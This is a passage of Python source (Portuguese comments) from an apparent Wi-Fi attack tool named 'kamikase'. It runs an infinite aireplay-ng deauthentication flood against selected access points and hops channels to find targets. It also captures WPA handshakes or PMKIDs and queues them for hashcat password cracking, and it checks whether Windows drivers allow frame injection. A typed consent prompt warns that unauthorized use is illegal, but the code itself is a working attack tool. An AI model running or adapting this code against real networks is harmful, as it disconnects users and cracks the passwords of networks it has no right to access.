                usar_profundo = self.scan_continuo_profundo and (ciclo % 3 == 0)
                self.remapear_redes(scan_profundo=usar_profundo)
            except Exception as e:
                self.ui.warn(f"Erro no scan cíclico #{ciclo}: {e}")
            # Intervalo configurável entre scans
            if self.scan_continuo_stop.wait(float(CONTINUOUS_SCAN_INTERVAL_SEC)):
                break

    def _loop_channel_hopper(self):
        """Roda em paralelo ao scan contínuo: muda o canal da iface monitor
        a cada CHANNEL_HOP_INTERVAL_MS para que scanners passivos (scapy/iw)
        consigam ver redes em TODOS os canais 2.4GHz + 5GHz comuns. Sem isto
        a placa fica travada num único canal e o scan vê apenas ~25% das redes."""
        if not HAS_IW:
            return
        iface = self.iface_monitor or self.iface_orig
        if not iface:
            return
        canais = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13,
                  36, 40, 44, 48, 52, 56, 60, 64,
                  100, 104, 108, 112, 116, 120, 124, 128,
                  132, 136, 140, 149, 153, 157, 161, 165]
        idx = 0
        intervalo_s = max(0.05, CHANNEL_HOP_INTERVAL_MS / 1000.0)
        while not self.scan_continuo_stop.is_set():
            # Sem monitor ativo, não há iface monitor pra mexer
            if not self.monitor_ativo or not self.iface_monitor:
                if self.scan_continuo_stop.wait(2.0):
                    break
                continue
            # Se há captura de handshake em andamento (zona azul) OU deauth
            # ativo (zona vermelha), o canal da iface está travado no AP-alvo.
            # Não pular canal — senão airodump/aireplay perdem o canal.
            # Inclui v1.5.6: carrossel (modelo novo) também trava canal por slot.
            carrossel_ativo = (self.carrossel is not None and
                                self.carrossel.thread is not None and
                                self.carrossel.thread.is_alive() and
                                self.carrossel.canal_atual is not None)
            if self.capture_stops or self.deauth_procs or carrossel_ativo:
                if self.scan_continuo_stop.wait(1.0):
                    break
                continue
            canal = canais[idx % len(canais)]
            idx += 1
            try:
                subprocess.run(["iw", "dev", iface, "set", "channel", str(canal)],
                               timeout=2, check=False,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                # canal fora da regulatory domain — pula silenciosamente
                pass
            if self.scan_continuo_stop.wait(intervalo_s):
                break

    def mover_para_zona(self, bssid: str, destino: str,
                          perfil: str = "low", wordlist: Optional[str] = None,
                          wordlists: Optional[List[str]] = None,
                          contextual: bool = True, stop_on_crack: bool = True):
        """Chamado pelo dashboard via WebSocket quando o usuário arrasta
        um AP entre zonas. Dispara/encerra ataque deauth ou crack queue.
        Suporta wordlist única (legado) ou wordlists (array para fila sequencial).

        v1.5.8: vermelha e azul são MUTUAMENTE EXCLUSIVAS (decisão do usuário).
        Se há APs na vermelha e o destino é azul (ou vice-versa), os APs da
        zona conflitante são automaticamente movidos pra verde antes."""
        # MUTEX zona azul ↔ vermelha
        if destino in ("vermelha", "azul"):
            zona_conflito = "azul" if destino == "vermelha" else "vermelha"
            with self.zonas_lock:
                conflitos = list(self.zonas.get(zona_conflito, []))
            if conflitos:
                self.ui.warn(f"⚠ Zona {zona_conflito} tinha {len(conflitos)} AP(s) — "
                              f"movendo todos pra verde (mutex com {destino})")
                for b in conflitos:
                    with self.zonas_lock:
                        if b in self.zonas[zona_conflito]:
                            self.zonas[zona_conflito].remove(b)
                        if b not in self.zonas["verde"]:
                            self.zonas["verde"].append(b)
                    ap_c = next((a for a in self.alvos if a["bssid"] == b), None)
                    if ap_c:
                        emitir("ap_update", **ap_c)
                try: emitir("zona_mutex", origem=zona_conflito,
                              destino=destino, movidos=len(conflitos))
                except Exception: pass

        # Localiza AP e remove de qualquer zona atual
        with self.zonas_lock:
            origem = ""
            for z, lista in self.zonas.items():
                if bssid in lista:
                    lista.remove(bssid)
                    origem = z
                    break
            if destino in self.zonas:
                self.zonas[destino].append(bssid)
        ap = next((a for a in self.alvos if a["bssid"] == bssid), None)
        if not ap:
            return

        # ─── cancela captura infinita se saiu da zona azul ───
        if origem == "azul" and destino != "azul":
            ev_cap = getattr(self, "capture_stops", {}).get(bssid)
            if ev_cap:
                ev_cap.set()
                self.capture_stops.pop(bssid, None)
                self.ui.info(f"Captura infinita cancelada para {bssid}")

        # ─── encerra deauth se saiu da zona vermelha ───
        if origem == "vermelha" and bssid in self.deauth_stops:
            self.deauth_stops[bssid].set()
            # Aguarda thread terminar antes de remover do dict (B7: race condition)
            t_existente = self.deauth_threads.get(bssid)
            if t_existente:
                t_existente.join(timeout=1.0)
            self.deauth_stops.pop(bssid, None)
            self.deauth_threads.pop(bssid, None)
            self.ui.info(f"Deauth encerrado para {bssid}")

        # ─── entrada em vermelha ou azul: ativa monitor + carrossel ────
        if destino in ("vermelha", "azul"):
            if not self._garantir_monitor_ativo():
                ap["monitor_failed"] = True
                ap["monitor_aviso"] = ("Falha ao ativar monitor mode. Verifique "
                                        "driver da placa WiFi e airmon-ng.")
                emitir("monitor_failed", bssid=bssid, motivo=ap["monitor_aviso"])
                self.ui.error(f"⚠ {bssid}: monitor mode falhou.")
            else:
                # Verifica canal — sem ele o carrossel pula este AP
                if ap.get("canal") in (None, "", "?"):
                    self.ui.warn(f"  ⚠ {bssid}: canal desconhecido. "
                                  "Re-escaneie via NMCLI antes.")
                # Salva config de wordlists/perfil pro carrossel usar
                # quando capturar handshake (zona azul)
                if destino == "azul":
                    wls = wordlists if wordlists else ([wordlist] if wordlist else [])
                    if wls:
                        ap["crack_wordlists"] = wls
                    ap["crack_perfil"] = perfil
                    # Reset contadores se AP está vindo pra azul agora
                    # (origem != azul significa transição)
                    if origem != "azul":
                        ap["carrossel_ciclos"] = 0
                        ap["carrossel_tempo_acumulado_s"] = 0
                    ap["crack"] = {"status": "queued_carrossel",
                                    "progresso": 0.0, "eta": "?",
                                    "tentativa": 0,
                                    "tempo_acumulado_s": 0}
                # Atualiza iface no pmkid (caso seja usado em outros caminhos)
                if self.pmkid:
                    self.pmkid.iface = self.iface_monitor or self.iface_orig
                # Garantir carrossel rodando
                self._garantir_carrossel()
                self.ui.warn(f"⚡ {bssid} entrou em {destino} (canal "
                              f"{ap.get('canal','?')}) — carrossel orquestrando")

        # Persiste movimentação na memória
        if self.memoria:
            self.memoria.registrar_zona(bssid, destino)

        emitir("ap_update", **ap)

    def _loop_deauth_zona(self, bssid: str, stop_event: threading.Event):
        """Estratégia cirúrgica de deauth (v1.5.3):

          1) Trava o canal da iface monitor no canal do AP (essencial).
          2) Sobe `aireplay-ng --deauth 0 -a <BSSID> <iface>` ÚNICO, infinito.
             aireplay sozinho envia ~64 deauths broadcast a cada segundo —
             muito mais agressivo que o loop antigo (1 pkt / 200ms).
          3) Thread só monitora: se aireplay morrer, reinicia. Atualiza contador
             aproximado (+64/s) emitindo `ap_update`.
          4) On stop_event: termina aireplay limpo.

        Sem `-c` (cliente) — broadcast pra rede inteira, foco no roteador."""
        adquirido = False
        proc: Optional[subprocess.Popen] = None
        try:
            adquirido = self.deauth_semaforo.acquire(timeout=5.0)
            if not adquirido:
                self.ui.warn(f"  Deauth {bssid}: limite de {DEAUTH_THREAD_LIMIT} threads, pulando.")
                return
            if not (HAS_AIREPLAY and self.iface_monitor):
                self.ui.error(f"  Deauth {bssid}: aireplay-ng ou monitor mode ausentes.")
                return

            ap0 = next((a for a in self.alvos if a["bssid"] == bssid), None)
            canal = int(ap0.get("canal", 0)) if ap0 and ap0.get("canal") not in (None, "?", "") else 0

            # 1) Trava canal — CRÍTICO. Sem o canal certo, aireplay manda
            # frames pra um canal vazio e nada acontece na rede-alvo.
            if canal and HAS_IW:
                try:
                    subprocess.run(["iw", "dev", self.iface_monitor, "set", "channel", str(canal)],
                                    timeout=3, check=False,
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.ui.info(f"  Canal {canal} travado em {self.iface_monitor}")
                except Exception:
                    pass
            elif not canal:
                self.ui.warn(f"  ⚠ {bssid}: canal desconhecido — deauth pode "
                              "ser placebo. Use NMCLI antes de mover pra vermelha.")
                if ap0:
                    ap0["deauth_aviso"] = "canal desconhecido — re-scan via NMCLI"
                    emitir("ap_update", **ap0)

            self.deauth_procs.setdefault(bssid, [])
            inicio = time.time()
            while not stop_event.is_set():
                # 2) Sobe aireplay --deauth 0 (infinito) se não estiver vivo
                if proc is None or proc.poll() is not None:
                    cmd = ["aireplay-ng", "--deauth", "0",
                           "--ignore-negative-one",
                           "-a", bssid, self.iface_monitor]
                    if self.ctx.motor == "root-termux":
                        cmd = ["su", "-c", " ".join(cmd)]
                    try:
                        proc = subprocess.Popen(cmd,
                                                 stdout=subprocess.DEVNULL,
                                                 stderr=subprocess.DEVNULL)
                        self.deauth_procs[bssid] = [proc]
                        self.ui.warn(f"  ⚡ aireplay --deauth 0 PID={proc.pid} → {bssid}")
                    except Exception as e:
                        self.ui.error(f"  aireplay falhou: {e}")
                        if stop_event.wait(2.0):
                            break
                        continue
                # 3) Atualiza contador aproximado: aireplay envia ~64 pkts/s
                if stop_event.wait(1.0):
                    break
                with self.contador_lock:
                    self.contador_global += 64
                    self.contador_por_bssid[bssid] = self.contador_por_bssid.get(bssid, 0) + 64
                ap = next((a for a in self.alvos if a["bssid"] == bssid), None)
                if ap:
                    ap["pacotes"] = self.contador_por_bssid[bssid]
                    ap["deauth_uptime_s"] = int(time.time() - inicio)
                    emitir("ap_update", **ap)
        except Exception as e:
            self.ui.warn(f"Loop deauth {bssid} caiu: {e}")
        finally:
            # 4) Termina aireplay limpo
            if proc and proc.poll() is None:
                try: proc.terminate()
                except Exception: pass
                try: proc.wait(timeout=2)
                except Exception:
                    try: proc.kill()
                    except Exception: pass
            self.deauth_procs.pop(bssid, None)
            if adquirido:
                try: self.deauth_semaforo.release()
                except Exception: pass

    def _iniciar_crack_async(self, ap: Dict[str, Any], perfil: str,
                              wordlists: List[str], contextual: bool = True,
                              stop_on_crack: bool = True):
        """Captura PMKID/handshake do AP e enfileira no hashcat com múltiplas wordlists."""
        bssid = ap["bssid"]
        wl_validas = []
        for wl in wordlists or []:
            wl_path = Path(wl)
            if not wl_path.is_absolute():
                wl_path = WORDLIST_DIR / wl_path.name
            if wl_path.exists():
                wl_validas.append(str(wl_path))
        if not wl_validas:
            ap["crack"] = {
                "status": "wordlist_missing",
                "erro": "Selecione ao menos uma wordlist valida em ./WordList/",
                "progresso": 0.0,
                "eta": "?",
            }
            emitir("ap_update", **ap)
            self.ui.warn(f"Crack de {bssid} cancelado: nenhuma wordlist valida.")
            return
        ap["crack"] = {"status": "capture_queued", "progresso": 0.0, "eta": "?"}
        emitir("ap_update", **ap)
        self.ui.info(f"🎯 Capturando handshake de {bssid} para crack...")

        # Stop event por-AP para captura infinita ser cancelável (ao sair da zona azul)
        if not hasattr(self, "capture_stops"):
            self.capture_stops = {}
        # Se já existe captura em andamento, cancela antes de iniciar nova
        ev_existente = self.capture_stops.get(bssid)
        if ev_existente:
            ev_existente.set()
        capture_stop = threading.Event()
        self.capture_stops[bssid] = capture_stop

        def _worker():
            ap["crack"] = {"status": "capturing", "progresso": 0.0, "eta": "?",
                            "tentativa": 0, "estrategia": 0}
            emitir("ap_update", **ap)
            def _on_tentativa(estrategia, n):
                ap["crack"] = {"status": "capturing", "progresso": 0.0, "eta": "?",
                                "tentativa": n, "estrategia": estrategia}
                try: emitir("handshake_tentativa", bssid=bssid,
                              estrategia=estrategia, tentativa=n)
                except Exception: pass
                emitir("ap_update", **ap)
            try:
                pcap = (self.pmkid.capturar_infinito(bssid, ap.get("canal", 0) or 0,
                                                       stop_event=capture_stop,
                                                       on_tentativa=_on_tentativa)
                          if self.pmkid else None)
            except Exception as e:
                self.ui.warn(f"capturar_infinito propagou ({type(e).__name__}): {e}")
                pcap = None
            if not pcap:
                if capture_stop.is_set():
                    ap["crack"] = {"status": "capture_cancelled", "progresso": 0.0, "eta": "?"}
                else:
                    ap["crack"] = {"status": "capture_failed",
                                    "erro": "captura cancelada/falhou", "progresso": 0.0, "eta": "?"}
                emitir("ap_update", **ap)
                self.capture_stops.pop(bssid, None)
                return
            try: emitir("handshake_capturado", bssid=bssid, pcap=str(pcap))
            except Exception: pass
            self.capture_stops.pop(bssid, None)
            # Persiste handshake na memória local (./memoria/handshakes/)
            if self.memoria:
                pcap_persistido = self.memoria.registrar_handshake(
                    bssid, ap.get("essid", ""), pcap)
                ap["handshake_path"] = str(pcap_persistido)
                ap["handshake_em"] = datetime.now().isoformat()
                pcap = pcap_persistido
            self.ui.success(f"  Handshake/PMKID capturado: {pcap}")
            # Converte wordlists para Path objects
            wl_paths = []
            for wl in wl_validas:
                wl_path = Path(wl)
                if not wl_path.is_absolute():
                    wl_path = WORDLIST_DIR / wl_path.name
                if wl_path.exists():
                    wl_paths.append(wl_path)
            ap["crack"] = {"status": "queued", "progresso": 0.0, "eta": "?", "wordlists": [p.name for p in wl_paths]}
            emitir("ap_update", **ap)
            self.hashcat_worker.enfileirar(
                bssid=bssid, essid=ap.get("essid", ""),
                pcapng=pcap, perfil=perfil, wordlists=wl_paths,
                contextual=contextual, stop_on_crack=stop_on_crack)

        threading.Thread(target=_worker, daemon=True,
                          name=f"capture-{bssid}").start()

    def reset_deauth(self, bssid: str):
        """Zera contador do AP e garante carrossel ativo. No modelo carrossel,
        não há thread per-AP pra reiniciar — o carrossel já cicla por canais.
        Botão é mais um 'zerei o histórico, ainda atacando' do que reset real."""
        with self.contador_lock:
            self.contador_por_bssid[bssid] = 0
        ap = next((a for a in self.alvos if a["bssid"] == bssid), None)
        if ap:
            ap["pacotes"] = 0
            emitir("ap_update", **ap)
        self._garantir_carrossel()
        self.ui.info(f"↻ Contador zerado para {bssid} (carrossel segue ativo)")

    def recapturar_handshake(self, bssid: str):
        """Re-marca AP da zona azul pra captura: limpa handshake_path antigo,
        cancela job hashcat se houver, e o carrossel re-tenta no próximo slot
        deste canal. Idempotente."""
        ap = next((a for a in self.alvos if a["bssid"] == bssid), None)
        if not ap:
            self.ui.warn(f"recapturar_handshake: BSSID {bssid} não encontrado")
            return
        # Cancela job hashcat (se ja foi enfileirado/rodando)
        if self.hashcat_worker:
            try: self.hashcat_worker.cancelar(bssid)
            except Exception: pass
        # Limpa estado de handshake/crack — carrossel volta a incluir este AP
        # nos slots de captura do canal dele
        ap.pop("handshake_path", None)
        ap.pop("handshake_em", None)
        ap["crack"] = {"status": "queued_carrossel", "progresso": 0.0,
                        "eta": "?", "tentativa": 0}
        emitir("ap_update", **ap)
        # Garantir carrossel ativo (caso o usuário tenha movido tudo pra fora antes)
        self._garantir_carrossel()
        self.ui.info(f"🔄 Recaptura programada para {bssid} no próximo slot ch{ap.get('canal','?')}")

    def reset_crack(self, bssid: str, recapturar: bool = False):
        """Reset crack — adaptado pro modelo carrossel. Se recapturar=True,
        delega pra recapturar_handshake (que limpa handshake_path e o
        carrossel re-tenta). Senão, só re-enfileira no hashcat com handshake
        existente."""
        ap = next((a for a in self.alvos if a["bssid"] == bssid), None)
        if not ap:
            return
        if self.hashcat_worker:
            try: self.hashcat_worker.cancelar(bssid)
            except Exception: pass
        if recapturar:
            self.recapturar_handshake(bssid)
            return
        # Sem recapturar: só re-enfileira hashcat com handshake existente
        ap["crack"] = {"status": "resetting", "progresso": 0.0}
        emitir("ap_update", **ap)
        if ap.get("handshake_path"):
            pcap = Path(ap["handshake_path"])
            wls = ap.get("crack_wordlists") or []
            wl_paths = []
            for w in wls:
                wp = Path(w) if Path(w).is_absolute() else WORDLIST_DIR / w
                if wp.exists():
                    wl_paths.append(wp)
            if wl_paths and self.hashcat_worker:
                self.hashcat_worker.enfileirar(
                    bssid=bssid, essid=ap.get("essid", ""),
                    pcapng=pcap, perfil=ap.get("crack_perfil", "low"),
                    wordlists=wl_paths, contextual=True)
                self.ui.info(f"↻ Crack re-enfileirado para {bssid}")
        else:
            self.ui.info(f"↻ Crack reiniciado para {bssid} (usando handshake existente)")
            # Reenfileira com handshake existente se houver
            if ap.get("handshake_path"):
                pcap = Path(ap["handshake_path"])
                self.hashcat_worker.enfileirar(
                    bssid=bssid, essid=ap.get("essid", ""),
                    pcapng=pcap, perfil="low", wordlists=[],
                    contextual=True)

    # ─── PRÉ-CHECKS ──────────────────────────────────────────

    def _validar_pre_requisitos(self) -> bool:
        # Detecta interface WiFi
        self.iface_orig = self._detectar_iface()
        if not self.iface_orig:
            self.ui.error("Nenhuma interface WiFi detectada no sistema.")
            return False
        self.ui.info(f"Interface WiFi: {self.iface_orig}")

        # Verifica que pelo menos um motor de ataque está disponível
        plat = self.ctx.motor
        if plat in ("root-kali", "root-termux"):
            if not (HAS_AIREPLAY or HAS_MDK4 or HAS_SCAPY):
                self.ui.error("Nenhum motor de ataque disponível.")
                self.ui.info("Instale: apt install aircrack-ng mdk4  OU  pip install scapy")
                return False
        elif plat == "adm":
            if not HAS_SCAPY:
                self.ui.error("No Windows, kamikase exige Scapy + NPCAP.")
                self.ui.info("Instale: pip install scapy  + https://npcap.com/")
                return False
            # ─── Camada A + B: inspeção do driver Windows ───
            self.driver_info = self._inspecionar_driver_windows()
            self._reportar_driver_windows()
        return True

    def _inspecionar_driver_windows(self) -> Dict[str, Any]:
        """Camada A: parsea `netsh wlan show drivers` para detectar driver
        e capabilities. Camada B: cruza nome do driver contra
        DRIVERS_BLOQUEIAM_INJECTION (lista negra) e DRIVERS_PERMITEM_INJECTION
        (lista branca informativa).

        Retorna dict com: driver_nome, fornecedor, versao, monitor_listado,
        bloqueia_conhecido (bool), permite_conhecido (bool), motivo (str)."""
        info: Dict[str, Any] = {
            "driver_nome": "?",
            "fornecedor": "?",
            "versao": "?",
            "modos_listados": "",
            "monitor_listado": False,
            "bloqueia_conhecido": False,
            "permite_conhecido": False,
            "motivo": "",
            "fonte_motivo": "",
        }
        try:
            saida = subprocess.check_output(
                ["netsh", "wlan", "show", "drivers"],
                text=True, errors="ignore", timeout=8)
        except Exception as e:
            info["motivo"] = f"Não foi possível executar netsh ({e})."
            return info

        # Camada A: parse linhas-chave (PT-BR e EN-US)
        # "Driver" / "Driver"   |   "Fornecedor"/"Vendor"  |  "Versão"/"Version"
        m = re.search(r"(?:Driver|Driver name)\s*:\s*(.+)", saida)
        if m:
            info["driver_nome"] = m.group(1).strip()
        m = re.search(r"(?:Fornecedor|Vendor)\s*:\s*(.+)", saida)
        if m:
            info["fornecedor"] = m.group(1).strip()
        m = re.search(r"(?:Versão|Version)\s*:\s*(.+)", saida)
        if m:
            info["versao"] = m.group(1).strip()

        # "Modos de operação" / "Network types supported" / etc — heurística
        # ampla porque a saída varia muito entre versões/idiomas.
        m = re.search(r"(?:Modos de opera[çc]ão|Operation modes|Type)[^:]*:\s*(.+)",
                       saida, re.IGNORECASE)
        modos = m.group(1).strip() if m else ""
        info["modos_listados"] = modos
        # Confere se a string "Monitor" aparece em qualquer lugar relevante
        info["monitor_listado"] = bool(re.search(r"\bMonitor\b", saida, re.IGNORECASE))

        # Camada B: cruza com lista negra
        nome_completo = f"{info['fornecedor']} {info['driver_nome']}"
        for regex, motivo in DRIVERS_BLOQUEIAM_INJECTION:
            if re.search(regex, nome_completo, re.IGNORECASE):
                info["bloqueia_conhecido"] = True
                info["motivo"] = motivo
                info["fonte_motivo"] = "lista_negra"
                break
        # Cruza com lista branca (informativa, não sobrescreve bloqueio)
        if not info["bloqueia_conhecido"]:
            for regex, motivo in DRIVERS_PERMITEM_INJECTION:
                if re.search(regex, nome_completo, re.IGNORECASE):
                    info["permite_conhecido"] = True
                    info["motivo"] = motivo
                    info["fonte_motivo"] = "lista_branca"
                    break

        # Se ainda não temos motivo e netsh não listou Monitor → suspeito
        if not info["motivo"] and not info["monitor_listado"]:
            info["motivo"] = ("Driver não expõe modo Monitor na saída do netsh — "
                              "frames podem ser descartados silenciosamente.")
            info["fonte_motivo"] = "netsh_sem_monitor"
        return info

    def _reportar_driver_windows(self):
        """Imprime diagnóstico do driver Windows com cores e veredicto."""
        info = self.driver_info
        self.ui.info(f"Driver detectado: {info.get('driver_nome', '?')} "
                     f"v{info.get('versao', '?')}  ({info.get('fornecedor', '?')})")
        if info.get("monitor_listado"):
            self.ui.success("netsh listou modo Monitor — driver provavelmente aceita injection.")
        else:
            self.ui.warn("netsh NÃO listou modo Monitor — driver provavelmente bloqueia injection.")

        if info.get("bloqueia_conhecido"):
            self.ui.error("=" * 64)
            self.ui.error("⚠ DRIVER NA LISTA NEGRA DE INJECTION 802.11 (Windows)")
            self.ui.error(f"   {info.get('motivo', '')}")
            self.ui.error("   Os frames serão enviados pelo scapy mas DESCARTADOS pelo")
            self.ui.error("   driver antes de chegar à antena. Contador subirá, mas")
            self.ui.error("   nenhum cliente será desconectado de fato (placebo).")
            self.ui.error("   Solução: USB adapter Alfa AWUS036NHA / TL-WN722N v1 / Panda PAU09,")
            self.ui.error("   ou bootar Kali Linux (driver iwlwifi expõe monitor neste mesmo HW).")
            self.ui.error("=" * 64)
        elif info.get("permite_conhecido"):
            self.ui.success(f"Driver na lista branca: {info.get('motivo', '')}")
        elif not info.get("monitor_listado"):
            self.ui.warn(info.get("motivo", "Driver de status desconhecido."))

    def _detectar_iface(self) -> str:
        try:
            if self.ctx.motor == "adm":
                # netsh wlan show interfaces
                saida = subprocess.check_output(
                    ["netsh", "wlan", "show", "interfaces"],
                    text=True, errors="ignore", timeout=5)
                m = re.search(r"Name\s*:\s*(.+)", saida)
                if m:
                    return m.group(1).strip()
            elif self.ctx.motor == "root-kali" and HAS_IW:
                saida = subprocess.check_output(
                    ["iw", "dev"], text=True, errors="ignore", timeout=5)
                m = re.search(r"Interface\s+(\w+)", saida)
                if m:
                    return m.group(1)
            elif self.ctx.motor == "root-termux":
                # Termux convencionalmente wlan0
                if os.path.exists("/sys/class/net/wlan0"):
                    return "wlan0"
        except Exception:
            pass
        # Fallback: tenta wlan0
        if os.path.exists("/sys/class/net/wlan0"):
            return "wlan0"
        return ""

    # ─── CONSENT DUPLO ───────────────────────────────────────

    def _consent_duplo(self) -> bool:
        # Camada A+B: se driver Windows bloqueia, exige confirmação técnica primeiro
        bloqueia = bool(self.driver_info.get("bloqueia_conhecido"))
        sem_monitor = (self.ctx.motor == "adm"
                        and not self.driver_info.get("monitor_listado", True))
        if bloqueia or sem_monitor:
            self.ui.warn("=" * 64)
            self.ui.warn("PRÉ-CHECK TÉCNICO — driver Windows pode descartar os frames")
            self.ui.warn("=" * 64)
            if bloqueia:
                self.ui.error(f"Driver na lista negra: {self.driver_info.get('driver_nome', '?')}")
                self.ui.error(self.driver_info.get("motivo", ""))
            else:
                self.ui.warn(self.driver_info.get("motivo",
                             "Driver não expõe modo Monitor."))
            self.ui.info("")
            self.ui.info("Você reconhece que o ataque pode ser PLACEBO neste hardware?")
            self.ui.info("Para tentar mesmo assim, digite EXATAMENTE: FORCAR")
            try:
                tecnico = input("  > ").strip()
            except (EOFError, KeyboardInterrupt):
                return False
            if tecnico != "FORCAR":
                self.ui.warn("Cancelado pelo pré-check técnico.")
                self.ui.info("Sugestão: rode em Linux/Kali (driver iwlwifi expõe monitor) "
                             "ou use USB adapter Alfa/TL-WN722N v1.")
                return False
            self.ui.warn("Pré-check sobrescrito — prosseguindo mesmo com driver suspeito.")

        # Camada ÉTICA: consent legal idêntico ao original
        self.ui.warn("=" * 64)
        self.ui.warn("⚠  KAMIKASE — DEAUTH FLOOD 802.11 EM TODAS AS REDES VISÍVEIS  ⚠")
        self.ui.warn("=" * 64)
        self.ui.error("AVISO LEGAL: Operar deauth flood contra rede sem autorização")
        self.ui.error("explícita do proprietário é CRIME (Lei 12.737/2012 BR; CFAA EUA).")
        self.ui.error("Esta ferramenta é para PENTEST AUTORIZADO, lab pessoal ou CTF.")
        self.ui.warn("")
        self.ui.warn("Você confirma que TODAS as redes WiFi em alcance da sua placa")
        self.ui.warn("são SUAS ou que você tem AUTORIZAÇÃO ESCRITA do proprietário?")
        self.ui.info("")
        self.ui.info("Para confirmar, digite EXATAMENTE: EU AUTORIZO")
        try:
            resposta = input("  > ").strip()
        except (EOFError, KeyboardInterrupt):
            return False
        if resposta != "EU AUTORIZO":
            self.ui.error("Confirmação inválida. Operação cancelada.")
            return False
        self.ui.success("Autorização registrada. Procedendo.")
        return True

    # ─── DISCOVERY DE APs ────────────────────────────────────

    @staticmethod
    def _normalizar_bssid(bssid: Any) -> str:
        b = str(bssid or "").strip().upper().replace("\\:", ":")
        pares = re.findall(r"[0-9A-F]{2}", b)
        if len(pares) >= 6:
            return ":".join(pares[:6])
        return b

    @staticmethod
    def _canal_para_freq(canal: Any) -> Optional[int]:
        try:
            ch = int(canal)
        except Exception:
            return None
        if 1 <= ch <= 13:
            return 2407 + (ch * 5)
        if ch == 14:
            return 2484
        if 32 <= ch <= 177:
            return 5000 + (ch * 5)
        return None

    @staticmethod
    def _freq_para_canal(freq_mhz: Any) -> Any:
        try:
            freq = int(float(freq_mhz))
        except Exception:
            return "?"
        if freq == 2484:
            return 14
        if 2412 <= freq <= 2472:
            return int((freq - 2407) / 5)
        if 5000 <= freq <= 5900:
            return int((freq - 5000) / 5)
        if 5955 <= freq <= 7115:
            return int((freq - 5950) / 5)
        return "?"

    @staticmethod
    def _freq_label(freq_mhz: Any, canal: Any = "?") -> Tuple[Any, str, str]:
        try:
            freq = int(float(freq_mhz))
        except Exception:
            freq = KamikaseEngine._canal_para_freq(canal)
        if not freq:
            return "?", "?", "?"
        if 2400 <= freq < 2500:
            return freq, "2.4 GHz", "baixa"
        if 4900 <= freq < 5925:
            return freq, "5 GHz", "media"
        if 5925 <= freq <= 7125:
            return freq, "6 GHz", "alta"
        return freq, f"{round(freq / 1000, 2)} GHz", "?"

    @staticmethod
    def _signal_percent_para_dbm(signal: Any) -> Any:
        try:
            pct = int(float(signal))
        except Exception:
            return "?"
        return int((pct / 2) - 100)

    @staticmethod
    def _signal_label(rssi: Any = "?", signal_percent: Any = "?") -> str:
        try:
            val = float(rssi)
        except Exception:
            try:
                val = float(KamikaseEngine._signal_percent_para_dbm(signal_percent))
            except Exception:
                return "?"
        if val >= -55:
            return "alta"
        if val >= -72:
            return "media"
        return "baixa"

    @staticmethod
    def _escape_nmcli_value(value: str) -> str:
        return (value or "").replace("\\:", ":").replace("\\\\", "\\").strip()

    def _normalizar_ap(self, ap: Dict[str, Any], source: str = "") -> Optional[Dict[str, Any]]:
        bssid = self._normalizar_bssid(ap.get("bssid"))
        if not re.fullmatch(r"(?:[0-9A-F]{2}:){5}[0-9A-F]{2}", bssid):
            return None

        # Tenta extrair canal/freq de qualquer alias
        canal_raw = ap.get("canal", ap.get("chan", ap.get("channel", "?")))
        freq_raw = ap.get("freq_mhz", ap.get("frequency", ap.get("freq", "?")))

        # 1) Tenta normalizar canal pra int
        canal = "?"
        try:
            if str(canal_raw).strip() and str(canal_raw).strip() != "?":
                canal = int(float(canal_raw))
        except Exception:
            pass

        # 2) Tenta normalizar freq pra int
        freq_mhz = "?"
        try:
            if str(freq_raw).strip() and str(freq_raw).strip() != "?":
                freq_mhz = int(float(freq_raw))
        except Exception:
            pass

        # 3) Cross-fill: se temos canal mas não freq, calcula via tabela
        if canal != "?" and freq_mhz == "?":
            freq_calc = CHANNEL_TO_FREQ_ALL.get(canal)
            if freq_calc:
                freq_mhz = freq_calc
            else:
                # Tenta via _canal_para_freq (cobre 6GHz e edge cases)
                fc = self._canal_para_freq(canal)
                if fc:
                    freq_mhz = fc

        # 4) Cross-fill reverso: se temos freq mas não canal
        if freq_mhz != "?" and canal == "?":
            canal_calc = FREQ_TO_CHANNEL_ALL.get(freq_mhz)
            if canal_calc:
                canal = canal_calc
            else:
                cc = self._freq_para_canal(freq_mhz)
                if cc != "?":
                    canal = cc

        # 5) Banda — derivada de freq_mhz (sempre confiável quando temos freq)
        band_label = "?"
        band_ghz = "?"
        if freq_mhz != "?":
            try:
                fv = int(freq_mhz)
                if 2400 <= fv < 2500:
                    band_label, band_ghz = "2.4 GHz", 2.4
                elif 4900 <= fv < 5925:
                    band_label, band_ghz = "5 GHz", 5.0
                elif 5925 <= fv <= 7125:
                    band_label, band_ghz = "6 GHz", 6.0
            except Exception:
                pass

        rssi = ap.get("rssi_dbm", ap.get("rssi", "?"))
        signal_percent = ap.get("signal_percent", ap.get("signal", "?"))
        if rssi in (None, "", "?"):
            rssi = self._signal_percent_para_dbm(signal_percent)
        security = ap.get("security", ap.get("crypto", "?")) or "OPEN"
        essid = ap.get("essid", ap.get("ssid", "<oculto>")) or "<oculto>"
        # Filtro de ESSID inválido — "?" puro não tem valor pro usuário e
        # poluí a UI. Mantém "<oculto>" porque é informação legítima.
        essid_strip = str(essid).strip()
        if essid_strip == "?" or essid_strip == "":
            return None
        normalizado = dict(ap)
        normalizado.update({
            "essid": str(essid).strip() or "<oculto>",
            "bssid": bssid,
            "canal": canal,
            "freq_mhz": freq_mhz,
            "band_ghz": band_ghz,
            "band_label": band_label,
            "rssi": rssi,
            "rssi_dbm": rssi,
            "signal_percent": signal_percent,
            "signal_label": self._signal_label(rssi, signal_percent),
            "security": str(security).strip() or "OPEN",
            "crypto": str(security).strip() or "OPEN",
            "source": source or ap.get("source", "?"),
        })
        return normalizado

    def _mesclar_aps(self, *listas: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Merge inteligente: para cada BSSID, preserva canal/freq de qualquer
        fonte que conseguiu detectar (não sobrescreve com '?'), pega RSSI mais
        forte (menos negativo) e security mais detalhada."""
        por_bssid: Dict[str, Dict[str, Any]] = {}
        for lista in listas:
            for ap in lista or []:
                norm = self._normalizar_ap(ap, ap.get("source", ""))
                if not norm:
                    continue
                bssid = norm["bssid"]
                atual = por_bssid.get(bssid)
                if not atual:
                    por_bssid[bssid] = norm
                    continue

                # Merge campo-a-campo: prefere valor "real" sobre "?"
                mesclado = dict(atual)
                for k, v in norm.items():
                    val_atual = atual.get(k)
                    val_atual_invalido = val_atual in (None, "", "?")
